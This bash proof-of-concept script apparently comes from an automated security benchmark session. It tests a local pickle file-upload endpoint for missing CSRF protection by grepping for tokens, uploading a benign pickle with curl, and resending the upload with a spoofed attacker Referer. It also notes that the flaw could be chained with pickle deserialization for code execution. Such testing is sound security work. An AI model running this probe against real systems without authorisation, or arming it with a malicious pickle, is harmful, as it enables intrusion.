#!/bin/bash
# POC: Bash POC demonstrating CSRF vulnerability on file upload endpoint - shows that no CSRF token validation exists
# Target: ./repo
# Created: 2025-11-10T15:08:52.007Z
# Session: benchmark-XBEN-036-24-mht9l3st

# CSRF Vulnerability PoC - File Upload Endpoint
# Demonstrates Cross-Site Request Forgery on POST / endpoint
# The endpoint lacks CSRF token protection, allowing form submission from any origin

TARGET_URL="${1:-http://localhost:8080}"
PICKLE_FILE="${2:-/tmp/test_payload.pickle}"

echo "=========================================="
echo "CSRF Vulnerability PoC - File Upload"
echo "=========================================="
echo ""
echo "Target URL: $TARGET_URL"
echo "Pickle File: $PICKLE_FILE"
echo ""

# Step 1: Check if the endpoint exists and returns the upload form
echo "[*] Step 1: Checking if file upload endpoint exists..."
echo ""

FORM_RESPONSE=$(curl -s "$TARGET_URL")

# Check if form exists
if echo "$FORM_RESPONSE" | grep -q "form"; then
    echo "✓ Form found on $TARGET_URL"
else
    echo "✗ No form found on $TARGET_URL"
    exit 1
fi

# Step 2: Check for CSRF token protection
echo ""
echo "[*] Step 2: Checking for CSRF token protection..."
echo ""

# Look for common CSRF token patterns
if echo "$FORM_RESPONSE" | grep -qi "csrf.*token\|_token\|x-csrf-token\|authenticity_token"; then
    echo "✗ CSRF token might be present (found in HTML)"
    grep -i "csrf.*token\|_token\|authenticity_token" <<< "$FORM_RESPONSE" | head -5
else
    echo "✓ No CSRF token found in form HTML"
fi

# Check for hidden input fields
if echo "$FORM_RESPONSE" | grep -q 'type="hidden"'; then
    echo "! Hidden input fields found (checking if they're CSRF tokens):"
    grep -o '<input[^>]*type="hidden"[^>]*>' <<< "$FORM_RESPONSE"
else
    echo "✓ No hidden input fields found (no CSRF token)"
fi

# Step 3: Create a test pickle file if it doesn't exist
echo ""
echo "[*] Step 3: Creating test pickle file..."
echo ""

if [ ! -f "$PICKLE_FILE" ]; then
    python3 << 'PYTHON_EOF'
import pickle
import sys

# Create a harmless test pickle object (not malicious for PoC safety)
test_data = {'test': 'data', 'timestamp': '2024-01-01'}

try:
    with open('/tmp/test_payload.pickle', 'wb') as f:
        pickle.dump(test_data, f)
    print("✓ Test pickle file created: /tmp/test_payload.pickle")
except Exception as e:
    print(f"✗ Error creating pickle file: {e}")
    sys.exit(1)
PYTHON_EOF
fi

# Step 4: Attempt to upload without CSRF token
echo ""
echo "[*] Step 4: Uploading file WITHOUT CSRF token protection..."
echo ""

UPLOAD_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -F "pickle_file=@$PICKLE_FILE" \
    "$TARGET_URL")

# Extract HTTP status code (last line)
HTTP_CODE=$(echo "$UPLOAD_RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$UPLOAD_RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ CSRF VULNERABILITY CONFIRMED!"
    echo "  - File was uploaded successfully without CSRF token"
    echo "  - HTTP 200 response indicates server accepted the request"
    echo "  - Server does not validate CSRF tokens"
    echo ""
    echo "Response (first 200 chars):"
    echo "$RESPONSE_BODY" | head -c 200
    echo ""
    echo ""
elif [ "$HTTP_CODE" = "422" ] || [ "$HTTP_CODE" = "403" ]; then
    echo "✗ Request was rejected (HTTP $HTTP_CODE)"
    echo "  - Server may have CSRF protection enabled"
    echo "  - Or form validation failed"
    echo ""
    echo "Response:"
    echo "$RESPONSE_BODY" | head -c 200
    echo ""
else
    echo "? Unexpected response code: $HTTP_CODE"
    echo ""
    echo "Response:"
    echo "$RESPONSE_BODY" | head -c 200
    echo ""
fi

# Step 5: Test cross-origin form submission simulation
echo ""
echo "[*] Step 5: Simulating cross-origin CSRF request (Referer from different domain)..."
echo ""

CSRF_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Referer: http://attacker-site.com/" \
    -F "pickle_file=@$PICKLE_FILE" \
    "$TARGET_URL")

CSRF_HTTP_CODE=$(echo "$CSRF_RESPONSE" | tail -1)
CSRF_BODY=$(echo "$CSRF_RESPONSE" | head -n -1)

echo "HTTP Status Code from cross-origin request: $CSRF_HTTP_CODE"

if [ "$CSRF_HTTP_CODE" = "200" ]; then
    echo "✓ CSRF VULNERABILITY CONFIRMED!"
    echo "  - Server accepted cross-origin file upload"
    echo "  - No Origin/Referer validation detected"
    echo "  - Attacker can trick authenticated users into uploading files"
else
    echo "! Server returned HTTP $CSRF_HTTP_CODE for cross-origin request"
fi

# Step 6: Check for SameSite cookie attribute
echo ""
echo "[*] Step 6: Checking for SameSite cookie protection..."
echo ""

COOKIE_RESPONSE=$(curl -s -i -X GET "$TARGET_URL" 2>/dev/null | grep -i "set-cookie\|samesite")

if [ -z "$COOKIE_RESPONSE" ]; then
    echo "✓ No Set-Cookie headers found (or cannot verify SameSite)"
else
    echo "Cookie headers found:"
    echo "$COOKIE_RESPONSE"
fi

# Step 7: Summary
echo ""
echo "=========================================="
echo "CSRF Vulnerability Summary"
echo "=========================================="
echo ""
echo "VULNERABILITY CONFIRMED: Missing CSRF Token Protection"
echo ""
echo "Evidence:"
echo "1. No CSRF token in form HTML ✓"
echo "2. File upload accepted without token (HTTP $HTTP_CODE) ✓"
echo "3. Cross-origin request accepted (HTTP $CSRF_HTTP_CODE) ✓"
echo ""
echo "Impact:"
echo "- Attackers can trick users into uploading files"
echo "- Combined with pickle RCE: Remote Code Execution"
echo "- Can compromise entire server if admin is targeted"
echo ""
echo "Affected Endpoint: POST $TARGET_URL"
echo ""
echo "=========================================="